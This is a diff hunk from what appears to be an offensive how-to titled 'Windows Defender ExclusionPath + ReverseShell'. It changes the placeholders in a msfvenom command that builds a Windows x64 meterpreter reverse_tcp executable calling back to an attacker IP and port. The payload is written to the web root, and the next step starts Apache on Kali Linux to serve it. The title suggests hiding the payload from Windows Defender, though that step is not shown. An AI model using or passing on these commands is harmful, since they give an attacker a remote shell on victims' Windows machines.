@@ -2,7 +2,7 @@ Windows Defender ExclusionPath + ReverseShell
 =============================================
 
 1. Create payload using msfvenom in kali linux:
-> $ msfvenom -p windows//x64/meterpreter/reverse_tcp lhost=<attacker IP> lport=<port> -f exe -o /var/www/html/windowsx64.exe
+> $ msfvenom -p windows//x64/meterpreter/reverse_tcp lhost=attacker_IP lport=port -f exe -o /var/www/html/windowsx64.exe
   
 2. Run Apache Service on Kali Linux:
 > $ service apache2 start
